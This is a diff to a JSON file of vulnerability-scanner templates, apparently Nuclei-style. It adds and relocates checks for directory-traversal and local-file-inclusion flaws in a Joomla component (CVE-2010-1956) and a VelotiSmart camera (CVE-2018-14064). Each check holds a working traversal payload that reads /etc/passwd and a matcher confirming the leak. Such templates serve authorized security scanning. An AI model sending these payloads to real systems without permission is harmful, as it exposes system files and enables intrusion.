@@ -2163,6 +2163,43 @@
       ]
     },
     {
+      "id": "CVE-2010-1956",
+      "info": {
+        "author": "daffainfo",
+        "description": "Directory traversal vulnerability in the Gadget Factory (com_gadgetfactory) component 1.0.0 and 1.5.0 for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the controller parameter to index.php.",
+        "name": "Joomla! Component Gadget Factory 1.0.0 - Local File Inclusion",
+        "reference": [
+          "https://www.exploit-db.com/exploits/12285",
+          "https://www.cvedetails.com/cve/CVE-2010-1956"
+        ],
+        "severity": "high",
+        "tags": "cve,cve2010,joomla,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?option=com_gadgetfactory&controller=../../../../../../../../../../etc/passwd%00"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2010-1979",
       "info": {
         "author": "daffainfo",
@@ -10204,6 +10241,44 @@
       ]
     },
     {
+      "id": "CVE-2018-14064",
+      "info": {
+        "author": "0x_Akoko",
+        "description": "The uc-http service 1.0.0 on VelotiSmart WiFi B-380 camera devices allows Directory Traversal, as demonstrated by /../../etc/passwd on TCP port 80.",
+        "name": "VelotiSmart Wifi - Directory Traversal",
+        "reference": [
+          "https://medium.com/@s1kr10s/velotismart-0day-ca5056bcdcac",
+          "https://www.exploit-db.com/exploits/45030",
+          "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-14064"
+        ],
+        "severity": "high",
+        "tags": "cve,cve2018,lfi,camera,iot"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:[x*]:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/../../etc/passwd"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2018-14574",
       "info": {
         "author": "pikpikcu",
@@ -12265,44 +12340,6 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/device.rsp?opt=user&cmd=list"
-          ]
-        }
-      ]
-    },
-    {
-      "id": "CVE-2018-14064",
-      "info": {
-        "author": "0x_Akoko",
-        "description": "The uc-http service 1.0.0 on VelotiSmart WiFi B-380 camera devices allows Directory Traversal, as demonstrated by /../../etc/passwd on TCP port 80.",
-        "name": "VelotiSmart Wifi - Directory Traversal",
-        "reference": [
-          "https://medium.com/@s1kr10s/velotismart-0day-ca5056bcdcac",
-          "https://www.exploit-db.com/exploits/45030",
-          "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-14064"
-        ],
-        "severity": "high",
-        "tags": "cve,cve2018,lfi,camera,iot"
-      },
-      "requests": [
-        {
-          "matchers": [
-            {
-              "regex": [
-                "root:[x*]:0:0"
-              ],
-              "type": "regex"
-            },
-            {
-              "status": [
-                200
-              ],
-              "type": "status"
-            }
-          ],
-          "matchers-condition": "and",
-          "method": "GET",
-          "path": [
-            "{{BaseURL}}/../../etc/passwd"
           ]
         }
       ]
